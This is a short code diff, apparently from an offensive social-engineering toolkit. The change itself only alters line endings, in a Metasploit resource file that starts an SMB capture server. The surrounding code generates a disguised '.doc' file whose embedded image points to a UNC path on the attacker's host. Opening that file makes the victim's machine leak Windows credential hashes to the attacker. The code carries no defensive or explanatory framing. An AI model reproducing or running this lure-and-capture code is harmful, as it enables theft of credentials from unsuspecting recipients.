@@ -211,7 +211,7 @@ if exploit == "unc_embed":
     rand_gen=random_string()
     filewrite=file(setdir + "/unc_config", "w")
     filewrite.write("use server/capture/smb\n")
-    filewrite.write("exploit -j\n\n")
+    filewrite.write("exploit -j\r\n\r\n")
     filewrite.close()
     filewrite=file(setdir + "/template.doc", "w")
     filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
